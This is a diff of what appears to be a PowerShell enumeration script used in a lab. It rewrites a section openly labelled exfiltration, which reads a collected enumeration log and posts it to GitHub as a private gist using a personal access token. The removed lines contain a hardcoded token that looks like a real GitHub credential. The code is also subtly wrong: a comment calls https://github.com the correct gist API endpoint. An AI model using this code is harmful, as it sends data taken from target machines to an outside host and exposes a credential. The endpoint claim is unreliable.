@@ -51,14 +51,33 @@ foreach ($server in $targets) {
     }
 }
 
-# 4. Exfiltrate Log to GitHub Gist
-$githubToken = "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" # Replace with your PAT
-if ($githubToken -ne "Your token here") {
-    Write-Host "Exfiltrating logs to GitHub..." -ForegroundColor Cyan
-    $content = Get-Content $logPath -Raw
-    $body = @{ description="Lab Enum"; public=$false; files=@{"enum.txt"=@{content=$content}}} | ConvertTo-Json
-    try {
-        $res = Invoke-RestMethod -Uri "https://github.com" -Method Post -Body $body -Headers @{Authorization="token $githubToken"}
-        Write-Host "Exfiltration Complete: $($res.html_url)" -ForegroundColor Green
-    } catch { Write-Warning "Exfiltration failed. Check Token/Internet." }
+# --- 4. EXFILTRATION TO GITHUB ---
+$githubToken = 'ghp_your_token_here' # <-- Check this is correct
+
+# Correct API Endpoint for Gists
+$apiUri = "https://github.com" 
+
+$logContent = Get-Content -Path "C:\Users\Public\enum.txt" -Raw
+
+$payload = @{
+    description = "Lab Results from $(hostname)"
+    public      = $false
+    files       = @{
+        "enum.txt" = @{ content = $logContent }
+    }
+} | ConvertTo-Json
+
+try {
+    $response = Invoke-RestMethod -Uri $apiUri `
+                                  -Method Post `
+                                  -Headers @{Authorization = "token $githubToken"} `
+                                  -Body $payload `
+                                  -ContentType "application/json"
+    
+    Write-Host "[+] Success! Gist created at: $($response.html_url)" -ForegroundColor Green
 }
+catch {
+    # This will print the actual error if it fails again
+    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
+}
+
